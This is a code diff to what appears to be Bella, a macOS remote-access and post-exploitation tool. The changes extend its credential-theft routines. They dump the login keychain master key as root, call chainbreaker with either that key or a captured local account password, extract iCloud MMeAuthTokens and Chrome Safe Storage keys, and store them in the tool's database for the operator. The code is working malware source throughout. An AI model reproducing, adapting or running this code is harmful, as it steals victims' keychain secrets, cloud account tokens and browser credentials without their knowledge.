@@ -1141,13 +1141,16 @@ def payload_cleaner():
 			print e
 	return
 
-def chainbreaker(kcpath, key, service):
+def chainbreaker(kcpath, key, service, password=None):
 	kcbreaker = readDB('chainbreaker', True)
 	if not kcbreaker:
 		return ("%sError reading chainbreaker from DB.\n" % red_minus, False)
 	path = payload_generator(kcbreaker)
 	try:
-		value = (subprocess.check_output("%s -f '%s' -k '%s' -s '%s'" % (path, kcpath, key, service), shell=True).replace('\n', ''), True)
+		if password:
+			value = (subprocess.check_output("%s -f '%s' -p '%s' -s '%s'" % (path, kcpath, password, service), shell=True).replace('\n', ''), True)
+		else:
+			value = (subprocess.check_output("%s -f '%s' -k '%s' -s '%s'" % (path, kcpath, key, service), shell=True).replace('\n', ''), True)
 		if '[!] ERROR: ' in value[0]:
 			return ("%sError decrypting %s with master key.\n\t%s" % (red_minus, service, value[0]), False)
 		print repr(value[0])
@@ -1182,6 +1185,7 @@ def kciCloudHelper(iCloudKey):
 	return tokz
 
 def getKeychains():
+	#will return the last modified keychain
 	send_msg("%sFound the following keychains for [%s]:\n" % (yellow_star, get_bella_user()), False)
 	kchains = glob("/Users/%s/Library/Keychains/login.keychain*" % get_bella_user())
 	for x in kchains:
@@ -1189,7 +1193,8 @@ def getKeychains():
 	if len(kchains) == 0:
 		send_msg("%sNo Keychains found for [%s].\n" % (yellow_star, get_bella_user()), True)
 		return
-	kchain = kchains[-1]
+	kchains.sort(key=os.path.getmtime)
+	kchain = kchains[-1] #get the last modified one
 	for x in kchains:
 		if x.endswith('-db'):
 			kchain = x
@@ -1245,7 +1250,9 @@ def bella_info():
 			sipEnabled = True
 	else:
 		sipEnabled = False
-	
+
+	kchain = getKeychains()
+
 	if not sipEnabled: #sipDisabled allows us to check like .1% of cases where user is on El Cap and has opted out of SIP
 		if is_there_SUID_shell():
 			kcpayload = readDB('keychaindump', True)
@@ -1253,13 +1260,13 @@ def bella_info():
 				send_msg("%sError reading KCDump payload from Bella Database.\n" % red_minus, False)
 			else:
 				kcpath = payload_generator(kcpayload)
-				kchain = getKeychains()
 				(success, msg) = do_root("%s '%s' | grep 'Found master key:'" % (kcpath, kchain)) # ??? Why doesnt this work for tim?
+				master_key = msg.replace("[+] Found master key: ", "").replace("\n", "")
 				if success: 
 					send_msg("    Login keychain master key found for [%s]:\n\t[%s]\n" % (kchain.split("/")[-1], msg.replace("[+] Found master key: ", "").replace("\n", "")), False)
 					if not readDB('mme_token'):
 						send_msg("\t%sAttempting to generate iCloud Auth Keys.\n" % blue_star, False)
-						iCloud = chainbreaker(kchain, msg.replace("[+] Found master key: ", "").replace("\n", ""), 'iCloud')
+						iCloud = chainbreaker(kchain, master_key, 'iCloud')
 						send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
 						if iCloud[1]:
 							send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
@@ -1272,7 +1279,7 @@ def bella_info():
 								send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
 					if not readDB('chromeSS'):
 						send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
-						chrome = chainbreaker(kchain, msg.replace("[+] Found master key: ", "").replace("\n", ""), 'Chrome Safe Storage')
+						chrome = chainbreaker(kchain, master_key, 'Chrome Safe Storage')
 						send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
 						if chrome[1]:
 							send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
@@ -1290,7 +1297,7 @@ def bella_info():
 				payload_cleaner()
 	
 	iTunesSearch = get_iTunes_accounts()
-	
+
 	for x in iTunesSearch:
 		if x[0]:
 			send_msg("%siCloud account present [%s:%s]\n" % (greenPlus, x[2], x[1]), False)
@@ -1318,6 +1325,28 @@ def bella_info():
 	checkLP = local_pw_read()
 	if isinstance(checkLP, str):
 		send_msg("%s%s's local account password is available.\n" % (yellow_star, checkLP.split(':')[0]), False) #get username
+		if not readDB('mme_token'):
+			send_msg("\t%sAttempting to generate iCloud Auth Keys with local password.\n" % blue_star, False)
+			iCloud = chainbreaker(kchain, 0, 'iCloud', checkLP.split(':')[1])
+			send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
+			if iCloud[1]:
+				send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
+				decrypted = kciCloudHelper(iCloud[0])
+				if not decrypted:
+					send_msg("\t%sError getting decrypted MMeAuthTokens with local password.\n" % red_minus, False)
+				else:
+					send_msg("\t%sDecrypted. Updating Bella database.\n" % blue_star, False)
+					updateDB(encrypt(decrypted), 'mme_token')
+					send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
+		if not readDB('chromeSS'):
+			send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
+			chrome = chainbreaker(kchain, 0, 'Chrome Safe Storage', checkLP.split(':')[1])
+			send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
+			if chrome[1]:
+				send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
+				updateDB(encrypt(chrome[0]), 'chromeSS')
+				send_msg("\t%sUpdated DB.\n" % greenPlus, False)
+
 
 	checkAP = applepwRead()
 	if isinstance(checkAP, str):
@@ -2212,7 +2241,7 @@ else:
 if '/'.join(os.path.abspath(__file__).split('/')[:-1]).lower() != ('%s/Library/%s' % (home_path, bella_folder)).lower(): #then set up and load agents, etc
 	print '[%s], [%s]' % ('/'.join(os.path.abspath(__file__).split('/')[:-1]).lower(), ('%s/Library/%s' % (home_path, bella_folder)).lower())
 	print 'Bella is not in the proper folder. Resetting'
-	create_bella_helpers(launch_agent_name, bella_folder, home_path)
+	#create_bella_helpers(launch_agent_name, bella_folder, home_path)
 
 helper_location = '/'.join(os.path.abspath(__file__).split('/')[:-1]) + '/'
 payload_list = []
